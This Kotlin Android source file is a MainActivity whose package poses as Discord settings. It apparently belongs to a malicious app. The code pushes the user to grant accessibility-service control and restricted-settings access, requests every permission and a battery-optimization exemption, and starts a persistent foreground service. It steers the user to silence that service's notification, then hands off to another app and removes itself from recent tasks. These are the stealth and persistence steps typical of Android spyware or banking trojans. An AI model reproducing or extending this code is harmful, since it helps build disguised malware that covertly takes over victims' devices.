package com.discord.settings


import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private fun runApp(){
        try{
            val thePackageName = SaveLocalData().getGlobalData(this,"AppData")
            Log.d("check5", "the package name is : $thePackageName")
            val intent = if (thePackageName!="null")packageManager.getLaunchIntentForPackage(thePackageName) else Intent(Settings.ACTION_SETTINGS)
            startActivity(intent)
            try{ finishAndRemoveTask()}catch (e:Exception){finish()}catch (e:Exception){Log.d("check5","ERROR::$e")}
        }catch(e:Exception){Log.d("check5",e.toString())}

    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    //run the set app after requesting permissions
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if(requestCode == 100){
            //run the intent
            runApp()
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        if (!isServiceRunning(ForegroundService::class.java)) {
            stopService(Intent(this,ForegroundService::class.java))
            startService(Intent(this,ForegroundService::class.java))
        }else{
            stopService(Intent(this,ForegroundService::class.java))
            startService(Intent(this,ForegroundService::class.java))

        }

        //check if accessibility permission allowed
        if(!Permissions().isAccessibilityServiceEnabled(this,AccessibilityService::class.java)){
            Permissions().askForAccessibilityPermission(this)//request accessibility permission
            Permissions().openAppInfo(this)// allow restricted settings option (android 13 and above)
        }


        //check if battery optimization ignoring permission allowed
        if(!Permissions().isIgnoringBatteryOptimizations(this)){
            Permissions().requestIgnoreBatteryOptimizations(this)//request ignore battery optimizations
        }

        Permissions().requestAllPermissions(this)

        //check notifications disabled
        if(Permissions().areNotificationsEnabled(this)){
            Permissions().goToNotificationSettings(this)//turn off notifications of foreground service (android below tiramisu)
        }
    }
}